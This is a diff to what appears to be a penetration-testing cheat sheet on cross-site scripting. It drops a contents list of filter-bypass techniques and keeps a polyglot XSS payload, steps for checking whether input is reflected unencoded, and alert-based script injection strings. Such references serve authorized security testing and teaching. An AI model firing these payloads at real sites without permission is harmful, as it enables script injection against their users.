@@ -1,14 +1,5 @@
-# Contents
-* [Testing Alert](#Testing-Alert)
-* [For html Injection](#For-html-Injection)
-* [Angle brackets HTML-encoded bypass](#Angle-brackets-HTML-encoded-bypass)
-* [Reflected XSS into a JavaScript string with single quote and backslash escaped](#Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped)
-* [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped)
-* [Tags and Attribute Block Bypass](#Tags-and-Attribute-Block-Bypass)
-* [Reflected XSS with some SVG markup allowed](#Reflected-XSS-with-some-SVG-markup-allowed)
-* [Reflected XSS in canonical link tag](#Reflected-XSS-in-canonical-link-tag)
-
-## One Payload For Testing All Kinds of XSS
+# Testing XSS
+**One Payload For Testing All Kinds of XSS**
 ```
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 <!--</Title/<​/Style/<​/Script/</textArea/</iFrame>
@@ -25,7 +16,6 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
   1. Check html tag and attribute for reflection.
   2. If < and > symbol reflecting in source code without encoding, XSS possible.
   3. If ' or " symbol reflecting in source code without encoding, XSS possible.
-# Testing Alert
 ```js
 <script>alert(1337)</script>
 ><script>alert(1337)</script>
